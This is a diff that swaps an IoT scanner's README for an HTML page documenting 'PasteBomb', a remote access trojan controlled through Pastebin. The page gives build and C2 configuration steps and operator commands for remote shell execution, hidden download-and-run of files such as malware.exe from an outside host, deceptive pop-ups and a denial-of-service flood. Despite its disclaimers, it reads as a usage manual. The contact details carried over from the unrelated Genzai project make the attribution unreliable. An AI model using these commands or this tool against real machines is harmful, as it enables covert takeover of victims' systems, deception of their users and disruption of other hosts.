@@ -1,86 +1,184 @@
-<h1 align="center">Genzai</h1>
-<p align="center"><b>The IoT Security Toolkit</b></p>
-<p align="center">
-<a href="#description">Description</a> • <a href="#features">Features</a> • <a href="./docs/documentation.md#setupnusage">Setup & Usage</a> • <a href="#acknowledgements">Acknowledgements</a> • <a href="#contact">Contact Me</a><br>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PasteBomb - Remote Administration Trojan (RAT) Proof-of-Concept</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+        h1, h2, h3, h4 {
+            color: #333;
+        }
+        h2 {
+            margin-top: 40px;
+        }
+        ul {
+            list-style-type: disc;
+            margin-left: 20px;
+        }
+        a {
+            color: #0066cc;
+        }
+        .badge {
+            margin: 5px;
+        }
+        .badge img {
+            height: 20px;
+        }
+        .banner {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .banner img {
+            width: 50%;
+        }
+        .description, .features, .installation, .usage, .security, .acknowledgements, .contact, .disclaimer {
+            margin: 20px 0;
+        }
+        .disclaimer {
+            background-color: #f8d7da;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Version-2.0-green">
-  <img src="https://img.shields.io/badge/Black%20Hat%20Arsenal-%20Asia%202024-blue">
-  <img src="https://img.shields.io/badge/Black%20Hat%20Arsenal-%20MEA%202024-blue">
-  <img src="https://img.shields.io/badge/GISEC Armory-%20Dubai%202024-blue">
-  <a href="https://www.buymeacoffee.com/umair9747" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 21px !important;width: 94px !important;" ></a>
-</p>
-
-</p>
-<hr>
-<img src="./genzai.png">
-<hr style="width:300px; height: 1px; margin: auto; margin-top: 20px;" />
-<br>
-<div id="description">
-<h2> Description </h2>
-Genzai helps you identify IoT or Internet of Things related dashboards across a single or set of targets provided as an input and furthermore scan them for default password issues and potential vulnerabilities based on paths and versions.
-<br></br>
-An example would be an admin panel for a home automation device acceessible over the internet. The tool will firstly fingerprint the IoT (product) based on a set of signatures from <a href="./signatures.json">signatures.json</a> and then based on the product identified, and the relevant templates in its DBs (<a href="./vendor-logins.json">vendor-logins.json</a> and <a href="./vendor-vulns.json">vendor-vulns.json</a>), scan it for vendor-specific default passwords like  admin:admin as well as look for any potential vulnerabilities.
-<br><br>
-Genzai currently supports fingerprinting over 20 IoT-based dashboards and has the same amount of templates to look for default password issues across them. It currently has a total of 10 vulnerability templates which will increase with coming updates.
-</div>
-<hr style="height: 1px;">
-
-<div id="features">
-<h2> Features </h2>
-
-<h4>Fingerprinting - The Wappalyzer of IoT Devices</h4>
-With Genzai, you can fingerprint the IoT Product running over a target based on the HTTP response received through it. With a support of 20 templates and counting, Genzai can look for categories such as:
-<br>
-
-- Wireless Router
-- Surveillance Camera
-- HMI or Human Machine Interface
-- Smart Power Control
-- Building Access Control System
-- Climate Control
-- Industrial Automation
-- Home Automation
-- Water Treatment System
-
-<h4>Default Password Checks</h4>
-Based on the IoT product identified and the presence of a relevant template in <a href="./vendor-logins.json">Vendor Logins DB</a>, Genzai will also check if the target is still using a vendor-specific default password considering how several devices across the internet still use a default password letting anyone to log in as an administrative user.
-</div>
-
-<h4>Vulnerability Scanning</h4>
-Also based on the IoT product identified and with the presence of a relevant template in <a href="./vendor-vulns.json">Vendor Vulns DB</a>, Genzai will check for any potential vulnerabilities across the target. While some of the templates actively flag issues based on an exposed endpoint or file, others may flag based on a vulnerable version.
-</div>
-
-<div id="v2">
-<h2>v2 is here! 🚀</h2>
-In this November 2024 update prior to <a href="https://blackhatmea.com/agenda-2024">Black Hat MEA</a>, we are glad to announce the v2 update for Black Hat MEA with some really exciting new features!
-
-<h4>📡 API Mode: Integrate Seamlessly</h4>
-Want to supercharge your existing pipeline or application with Genzai? The all-new API mode allows you to deploy an API server effortlessly and perform scans with ease. No fuss, just results. [<a href="./docs/v2.md#apimode">Learn more</a>]  
-
-<h4>🖥️ GUI Mode: Simplicity Meets Power</h4>
-Let’s face it—CLI is functional, but not always fun. That’s why we’ve introduced a sleek, web-based GUI mode! It’s intuitive, engaging, and designed to take your productivity to the next level. Say goodbye to monotony and hello to efficiency. [<a href="./docs/v2.md#guimode">Learn more</a>]  
-
-<h4>🌐 Recon Mode: Explore at Warp Speed</h4>
-Curious to see if IoT devices are lurking in a subnet? Or perhaps you need to probe a private network for vulnerabilities? Recon mode has your back, offering lightning-fast scanning to uncover hidden gems (or threats). [<a href="./docs/v2.md#reconmode">Learn more</a>]
-</div>
-
+<div class="banner">
+    <h1>PasteBomb</h1>
+    <p><strong>Remote Administration Trojan (RAT) Proof-of-Concept</strong></p>
+    <p>
+        <a href="#description" class="badge">Description</a> •
+        <a href="#features" class="badge">Features</a> •
+        <a href="#installation" class="badge">Installation</a> •
+        <a href="#usage" class="badge">Usage</a> •
+        <a href="#security" class="badge">Security Implications</a> •
+        <a href="#acknowledgements" class="badge">Acknowledgements</a> •
+        <a href="#contact" class="badge">Contact</a>
+    </p>
+    <img src="./pastebomb.png" alt="PasteBomb Logo">
+    <hr>
 </div>
 
-<div id="acknowledgements">
-<h2> Acknowledgements </h2>
-Genzai has been or will be noticed at,
-<ul type="disc">
-<li><a href="https://www.blackhat.com/asia-24/arsenal/schedule/index.html#genzai---the-iot-security-toolkit-37373">Black Hat Asia 2024 [Arsenal]</a></li>
-<li><a href="https://www.gisec.ae/gisec-armory">GISEC Armory Edition 1 Dubai 2024</a></li>
-<li><a href="https://blackhatmea.com/agenda-2024">Black Hat MEA 2024 [Arsenal]</a></li>
-</ul>
+<div id="description" class="description">
+    <h2>Description</h2>
+    <p>
+        <strong>PasteBomb</strong> is a proof-of-concept Remote Administration Trojan (RAT) that demonstrates how commands can be executed remotely using Pastebin instead of a traditional Command-and-Control (C2) server. This project is designed solely for educational purposes to highlight security risks and the importance of robust system hardening.
+    </p>
+    <p>
+        **PasteBomb** allows attackers to remotely execute commands, download files, display pop-up messages, and simulate Denial-of-Service (DoS) attacks on targeted systems. By using Pastebin as the medium for command execution, it illustrates a potential vulnerability of systems that fail to secure remote command input.
+    </p>
 </div>
 
-<div id="contact">
-<h2> Let's Connect! </h2>
-If you have any questions or feedback about Genzai or just want to connect with me, feel free to reach out via <a href="https://in.linkedin.com/in/umair-nehri-49699317a">LinkedIn</a> or <a href="mailto:umairnehri9747@gmail.com">Email</a>.
+<div id="features" class="features">
+    <h2>Features</h2>
+
+    <h4>Remote Command Execution</h4>
+    <p>Execute terminal commands dynamically fetched from Pastebin. For example:</p>
+    <pre><code>cmd dir</code></pre>
+    <pre><code>cmd ls /home/user/</code></pre>
+    <p>These commands will list files in the specified directory.</p>
+
+    <h4>File Operations</h4>
+    <p>Download and execute files on the target machine. You can optionally hide files during download:</p>
+    <pre><code>download http://example.com/file.exe C:\path\to\file.exe RUN,HIDE</code></pre>
+    <pre><code>download http://example.com/script.sh /usr/local/bin/script.sh RUN</code></pre>
+    <p>This will download and optionally execute files on the target system.</p>
+
+    <h4>Pop-Up Messaging</h4>
+    <p>Display customizable pop-up messages to the user on the target system:</p>
+    <pre><code>popmsg "This is a demonstration message!"</code></pre>
+    <p>This sends a pop-up message to the target’s browser.</p>
+
+    <h4>Denial-of-Service Simulation</h4>
+    <p>Perform a simulated DoS attack on a target IP and port:</p>
+    <pre><code>dos 192.168.1.100 80 120</code></pre>
+    <p>This simulates a DoS attack on the specified IP and port for 120 seconds.</p>
 </div>
 
-<h2>Legal Disclaimer</h2>
-Usage of Genzai for scanning or attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+<div id="installation" class="installation">
+    <h2>Installation</h2>
+
+    <h3>Prerequisites</h3>
+    <p>Before running **PasteBomb**, make sure you have Go (Golang) installed on your system.</p>
+
+    <h3>Clone the Repository</h3>
+    <pre><code>git clone https://github.com/yourusername/pastebomb.git</code></pre>
+    <pre><code>cd pastebomb</code></pre>
+
+    <h3>Configuration</h3>
+    <p>Create a <code>config.json</code> file in the project root with the following structure:</p>
+    <pre><code>{
+    "url": "https://pastebin.com/raw/<paste_id>",
+    "backups": [
+        "https://pastebin.com/raw/<backup_id1>",
+        "https://pastebin.com/raw/<backup_id2>"
+    ]
+}</code></pre>
+    <p>This configures the URLs where PasteBomb will fetch the commands from. Replace <code>&lt;paste_id&gt;</code>, <code>&lt;backup_id1&gt;</code>, and <code>&lt;backup_id2&gt;</code> with actual Pastebin IDs.</p>
+
+    <h3>Build and Run</h3>
+    <p>To compile the Go program:</p>
+    <pre><code>go build -o pastebomb main.go</code></pre>
+    <p>To run the executable:</p>
+    <pre><code>./pastebomb</code></pre>
+</div>
+
+<div id="usage" class="usage">
+    <h2>Usage</h2>
+    <p>Once **PasteBomb** is running, it will start fetching commands from the provided Pastebin URLs and execute them on the target system sequentially. Below are some example commands you can upload to Pastebin for execution:</p>
+
+    <h3>1. Remote Command Execution</h3>
+    <pre><code>cmd dir</code></pre>
+    <p>This command will list the files in the current directory.</p>
+
+    <h3>2. File Download and Execution</h3>
+    <pre><code>download http://example.com/malware.exe C:\Users\Public\malware.exe RUN,HIDE</code></pre>
+    <p>This will download and execute a malicious file on the target machine.</p>
+
+    <h3>3. Pop-Up Messages</h3>
+    <pre><code>popmsg "Your system is being updated!"</code></pre>
+    <p>This will display a pop-up message to the target user.</p>
+
+    <h3>4. Denial-of-Service Simulation</h3>
+    <pre><code>dos 192.168.1.100 80 120</code></pre>
+    <p>This simulates a DoS attack on the target system for 120 seconds.</p>
+</div>
+
+<div id="security" class="security">
+    <h2>Security Implications</h2>
+    <p><strong>PasteBomb</strong> is an educational tool designed to demonstrate potential security risks in system configurations. It highlights the following vulnerabilities:</p>
+    <ul>
+        <li>The dangers of executing remote commands without proper security measures.</li>
+        <li>The risks of downloading and executing unverified files from untrusted sources.</li>
+        <li>The need for monitoring and blocking unusual network traffic.</li>
+    </ul>
+    <p><strong>Note:</strong> The tool is intended for use in controlled, ethical environments for educational purposes only. Misuse may result in legal consequences. Always ensure that you have permission before running **PasteBomb** or similar tools on any system.</p>
+</div>
+
+<div id="acknowledgements" class="acknowledgements">
+    <h2>Acknowledgements</h2>
+    <p>**PasteBomb** is a demonstration tool for showcasing how command execution can be remotely controlled via a platform like Pastebin. It is not intended for malicious use. Contributions to improve or enhance this project are welcome.</p>
+</div>
+
+<div id="contact" class="contact">
+    <h2>Contact</h2>
+    <p>For any questions or feedback, feel free to reach out via:</p>
+    <ul>
+        <li><a href="https://in.linkedin.com/in/umair-nehri-49699317a" target="_blank">LinkedIn</a></li>
+        <li><a href="mailto:umairnehri9747@gmail.com" target="_blank">Email</a></li>
+    </ul>
+</div>
+
+<div class="disclaimer">
+    <h2>Legal Disclaimer</h2>
+    <p>**PasteBomb** is for educational and research purposes only. Usage of this tool to attack or scan systems without permission is illegal. Always obtain explicit consent before testing any system. The developers assume no responsibility for any misuse or damage caused by this tool.</p>
+</div>
+
+</body>
+</html>
